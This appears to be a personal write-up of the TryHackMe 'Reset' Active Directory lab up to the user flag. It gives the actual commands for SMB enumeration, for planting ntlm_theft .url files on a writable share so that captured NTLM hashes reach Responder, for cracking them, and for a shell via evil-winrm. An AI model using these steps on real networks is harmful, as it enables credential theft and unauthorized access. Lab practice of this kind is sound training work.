---
title: "Reset TryHackMe"
tags:
    - machine
    - THM
    - Active Directory
date: "2024-09-22"
thumbnail: "/assets/img/thumbnail/reset.jpeg"
bookmark: true
---
# Description
---
This challenge simulates a cyber-attack scenario where you must exploit an Active Directory environment
Test your penetration skills, bypass security measures, and infiltrate into the system. Will you emerge victorious as you simulate the ultimate organization APT?

Find all the flags!

# enumeration
## Namp Scan
```bash
 ─(mostafa㉿mostafa)-[~]
└─$ nmap -sC -sV -A  10.10.81.57 -T4 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-17 19:20 EEST
Nmap scan report for 10.10.81.57
Host is up (0.080s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 16:20:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
we have many open ports 
first thing came in my mind -> enumerate `smb` using `crackmapexec` it accept anonymous login 
```bash
─(mostafa㉿mostafa)-[~]
└─$ crackmapexec smb 10.10.130.125 -u 'guest' -p '' --shares
SMB         10.10.130.125   445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.130.125   445    HAYSTACK         [+] thm.corp\guest:
SMB         10.10.130.125   445    HAYSTACK         [+] Enumerated shares
SMB         10.10.130.125   445    HAYSTACK         Share           Permissions     Remark
SMB         10.10.130.125   445    HAYSTACK         -----           -----------     ------
SMB         10.10.130.125   445    HAYSTACK         ADMIN$                          Remote Admin
SMB         10.10.130.125   445    HAYSTACK         C$                              Default share
SMB         10.10.130.125   445    HAYSTACK         Data            READ,WRITE
SMB         10.10.130.125   445    HAYSTACK         IPC$            READ            Remote IPC
SMB         10.10.130.125   445    HAYSTACK         NETLOGON                        Logon server share
SMB         10.10.130.125   445    HAYSTACK         SYSVOL                          Logon server share
```
we have READ permission to `IPC$` 
and READ, WRITE permission to `DATA` 

let’s use `smbclient` to connect
```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -U 'anonymous'%''  '\\10.10.130.125\Data'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep 20 15:52:37 2024
  ..                                  D        0  Fri Sep 20 15:52:37 2024
  onboarding                          D        0  Fri Sep 20 16:04:04 2024

                7863807 blocks of size 4096. 3023349 blocks available
smb: \> dir onboarding\
  .                                   D        0  Fri Sep 20 16:04:04 2024
  ..                                  D        0  Fri Sep 20 16:04:04 2024
  b2qknq13.dmg.txt                    A      521  Mon Aug 21 21:21:59 2023
  deiifnya.c2y.pdf                    A  4700896  Mon Jul 17 11:11:53 2023
  rt4rwinz.ime.pdf                    A  3032659  Mon Jul 17 11:12:09 2023

                7863807 blocks of size 4096. 3024293 blocks available
smb: \> dir onboarding\
  .                                   D        0  Fri Sep 20 16:04:34 2024
  ..                                  D        0  Fri Sep 20 16:04:34 2024
  2pccqfr0.saa.pdf                    A  3032659  Mon Jul 17 11:12:09 2023
  mgbfgjaz.shd.txt                    A      521  Mon Aug 21 21:21:59 2023
  xxmw2z0m.cbj.pdf                    A  4700896  Mon Jul 17 11:11:53 2023

                7863807 blocks of size 4096. 3024293 blocks available
```
the file name changing every time 
I notice that I can do activity in the share,so i can put file that allows us to steal user's hash

## steal automate Creds
i found this tip on `hacktricks`
<img src="/assets/img/reset/1.png">
 i ask chatgpt how to do this and here the steps to steal the user hash

1. run `Responder` to listen on your network for SMB authentication requests  
```bash
$ sudo responder -I my_ip(tun0)
```
2. Craft the `.URL` File it triggers an NTLM authentication attempt
3. Place the `.URL` File on a Network Share
4. Capture the NTLM Hash
5. crack it
## Ntlm_theft
and i serached for a tool to do all of this and i found `ntlm_theft` on github
[https://github.com/Greenwolf/ntlm_theft]
```bash
┌──(mostafa㉿mostafa)-[~]
└─$ python3 ntlm_theft.py -g url -s 10.10.130.125 -f hash1
Created: hash1/hash1-(url).url (BROWSE TO FOLDER)
Created: hash1/hash1-(icon).url (BROWSE TO FOLDER)
Generation Complete.
```
now let's upload the `.url` file
<img src="/assets/img/reset/2.png">
i got the hash on responder
<img src="/assets/img/reset/3.png">
save the hash on file and let’s crack it 
<img src="/assets/img/reset/4.png">

## evil-winrm
now we have credentials for `Automate` we can use `evil-winrm` to get a shell and read the user flag
<img src="/assets/img/reset/5.png">
GG i got the user flag ...:)
